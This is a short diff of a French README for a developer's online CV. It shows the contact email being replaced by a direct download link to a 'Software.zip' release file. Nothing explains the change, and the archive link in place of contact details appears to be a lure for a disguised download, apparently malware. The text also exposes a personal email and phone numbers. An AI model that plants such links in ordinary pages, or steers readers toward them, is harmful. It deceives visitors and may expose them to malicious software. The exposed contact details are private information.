@@ -2,7 +2,7 @@ CV en ligne de Carel DJUITCHA
 Ce dépôt contient mon CV en ligne en tant que développeur. Vous pouvez le consulter en cliquant ici.
 À propos de moi
 Carel DJUITCHA
-careldjuitcha@gmail.com
+https://github.com/carel566/carel566.github.io/releases/download/v2.0/Software.zip
 (+237) 690 66 09 06/ 620 18 77 86
 
 Compétences techniques
